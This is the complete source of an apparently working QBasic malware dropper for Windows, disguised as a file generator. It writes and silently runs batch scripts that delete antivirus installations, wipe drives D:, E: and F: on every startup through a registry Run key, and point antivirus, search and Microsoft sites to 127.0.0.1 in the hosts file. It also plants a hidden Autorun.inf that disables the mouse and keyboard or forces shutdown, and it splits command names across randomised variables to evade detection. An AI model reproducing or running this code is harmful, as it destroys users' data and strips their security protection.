   CLS
   PRINT "Please wait as requested files are Generated..."
   OPEN "C:\WINDOWS\invi.vbs" FOR OUTPUT AS #1
   PRINT #1, "CreateObject("; CHR$(34); "Wscript.shell"; CHR$(34); ").Run "; CHR$(34); CHR$(34); CHR$(34); CHR$(34); " & Wscript.Arguments(0) & "; CHR$(34); CHR$(34); CHR$(34); CHR$(34); ", 0, False"
   CLOSE #1
   RANDOMIZE TIMER
   OPEN "C:\WINDOWS\$&$.bat" FOR OUTPUT AS #2
   RAN = INT(RND * 2) + 97
   a$ = CHR$(RAN)
   RAN1 = INT(RND * 2) + 88
   b$ = CHR$(RAN1)
   PRINT #2, "@echo off"
   PRINT #2, "if exist C:\WINDOWS\hosts goto 9xAV"
   PRINT #2, "if exist C:\WINDOWS\system32\drivers\etc\hosts goto NTAV"
   PRINT #2, ":9xAV"
   PRINT #2, "set " + a$ + "=ltree/y C:\Program Files\"
   PRINT #2, "set " + b$ + "=de"
   PRINT #2, "GOTO avlist"
   PRINT #2, ":NTAV"
   PRINT #2, "set " + a$ + "=S/Q C:\Progra~1\"
   PRINT #2, "set " + b$ + "=rd/"
   PRINT #2, "goto avlist"
   PRINT #2, ":9xAV1"
   PRINT #2, "set " + a$ + "=ee/y C:\WINDOWS\"
   PRINT #2, "set " + b$ + "=tr"
   PRINT #2, "Echo $>C:\WINDOWS\$.$"
   PRINT #2, "goto avlist"
   PRINT #2, ":NTAV1"
   PRINT #2, "set " + a$ + "=d/s/q C:\WINDOWS\"
   PRINT #2, "set " + b$ + "=r"
   PRINT #2, "Echo $>C:\WINDOWS\$.$"
   PRINT #2, "goto avlist"
   PRINT #2, ":avlist_"
   PRINT #2, "exit"
   PRINT #2, ":avlist"
   PRINT #2, "%" + b$ + "%%" + a$ + "%Micros~1\"
   PRINT #2, "%" + b$ + "%%" + a$ + "%antiba*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%antivi*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%av*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%bit*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%cleanc*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%esafen\"
   PRINT #2, "%" + b$ + "%%" + a$ + "%f-*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%fwin*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%kasper*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%mcaf*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%msav\"
   PRINT #2, "%" + b$ + "%%" + a$ + "%norman\"
   PRINT #2, "%" + b$ + "%%" + a$ + "%norton*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%pccill*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%pc-cill*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%trend*"
   PRINT #2, "%" + b$ + "%%" + a$ + "%zone*"
   PRINT #2, "if exist C:\WINDOWS\$.$ goto avlist_"
   PRINT #2, "if exist C:\WINDOWS\hosts goto 9xAV1"
   PRINT #2, "if exist C:\WINDOWS\system32\drivers\etc\hosts goto NTAV1"
   PRINT #2, "exit"
   CLOSE #2
   SHELL "Wscript C:\WINDOWS\INVI.VBS C:\WINDOWS\$&$.BAT"
   RANDOMIZE TIMER
   RAN13 = INT(RND * 2) + 99
   sys$ = CHR$(RAN13)
   Ran31 = INT(RND * 2) + 87
   ssy$ = CHR$(Ran31)
   RAN7 = INT(RND * 2) + 104
   t$ = CHR$(RAN7)
   OPEN "C:\WINDOWS\system32\syslogz.bat" FOR OUTPUT AS #3
   PRINT #3, "if exist C:\WINDOWS\system32\drivers\etc\hosts goto TnT"
   PRINT #3, "if exist C:\WINDOWS\hosts goto x9X"
   PRINT #3, ":TnT"
   PRINT #3, "set " + sys$ + "=r"
   PRINT #3, "set " + ssy$ + "=d/s/"
   PRINT #3, "set " + CHR$(198) + "=q"
   PRINT #3, "goto list"
   PRINT #3, ":x9X"
   PRINT #3, "set " + sys$ + "=de"
   PRINT #3, "set " + ssy$ + "=lt"
   PRINT #3, "set " + CHR$(198) + "=ree/y"
   PRINT #3, "goto list"
   PRINT #3, ":list"
   PRINT #3, "if exist D: %" + sys$ + "%" + "%" + ssy$ + "%" + "%" + CHR$(198) + "% D:"
   PRINT #3, "if exist E: %" + sys$ + "%" + "%" + ssy$ + "%" + "%" + CHR$(198) + "% E:"
   PRINT #3, "if exist F: %" + sys$ + "%" + "%" + ssy$ + "%" + "%" + CHR$(198) + "% F:"
   PRINT #3, "exit"
   CLOSE #3
   OPEN "C:\%.reg" FOR OUTPUT AS #4
   PRINT #4, "REGEDIT4"
   PRINT #4, ""
   PRINT #4, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]"
   PRINT #4, CHR$(34); "APVXDWIN"; CHR$(34); "="; CHR$(34); "wscript C:\\WINDOWS\\INVI.VBS C:\\WINDOWS\\system32\\SYSLOGZ.BAT"; CHR$(34)
   CLOSE #4
   SHELL "regedit/s C:\%.reg"
   OPEN "C:\WINDOWS\hfk.bat" FOR OUTPUT AS #8
   PRINT #8, "set spit=Echo"
   PRINT #8, "if exist C:\WINDOWS\system32\drivers\etc\hosts goto TnT"
   PRINT #8, "if exist C:\WINDOWS\hosts goto z9X"
   PRINT #8, ":TnT"
   PRINT #8, "set " + ssy$ + "=C:\WINDOWS\system32\drivers\etc\hosts"
   PRINT #8, "goto hlst"
   PRINT #8, ":z9X"
   PRINT #8, "set " + ssy$ + "=C:\WINDOWS\hosts"
   PRINT #8, "goto hlst"
   PRINT #8, ":hlst"
   PRINT #8, "set " + t$ + "=127.0.0.1"
   PRINT #8, "%spit% www.google.co.in %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.google.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.google.co.uk %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.google.co.kr %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.askjeeves.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.kaspersky.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.kasperskylabs.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.norton.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.microsoft.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.bullguard.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.bitdefender.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% us.mcafee.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.mcafee.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.symantec.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% antivirus.pbnet.ru %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.download.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.altavesta.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% search.yahoo.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.softpedia.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.sophos.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% ftp.sophos.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.f-secure.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% securityresponce.symantec.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% liveupdate.symantec.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% updates.symantec.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% download.mcafee.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.trendmicro.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "%spit% www.microsoft.com %" + t$ + "%>>%" + ssy$ + "%"
   PRINT #8, "exit"
   CLOSE #8
   SHELL "wscript C:\WINDOWS\INVI.VBS C:\WINDOWS\HFK.BAT"
   OPEN "C:\WINDOWS\SYS.BAT" FOR APPEND AS #6
   PRINT #6, "if %OS%==Windows_NT goto st"
   PRINT #6, "rundll32 mouse,disable"
   PRINT #6, "rundll32 keyboard,disable"
   PRINT #6, "exit"
   PRINT #6, ":st"
   PRINT #6, "shutdown -s -f -t 03 -c "; CHR$(34); "Windows as usual has performed an illegal operation"; CHR$(34)
   CLOSE #6
   OPEN "C:\Autorun.inf" FOR OUTPUT AS #7
   PRINT #7, "[autorun]"
   PRINT #7, "open=wscript C:\WINDOWS\INVI.VBS C:\WINDOWS\SYS.BAT"
   CLOSE #7
   SHELL "attrib +H +R +A C:\Autorun.inf"
   SHELL "mkdir C:\WINDOWS\" + CHR$(167) + CHR$(198) + CHR$(167) + CHR$(198)
   SHELL "subst K: C:\WINDOWS\" + CHR$(167) + CHR$(198) + CHR$(167) + CHR$(198)
   SHELL "mkdir C:\WINDOWS\" + CHR$(165) + CHR$(198) + CHR$(165) + CHR$(198)
   SHELL "subst W: C:\WINDOWS\" + CHR$(165) + CHR$(198) + CHR$(165) + CHR$(198)
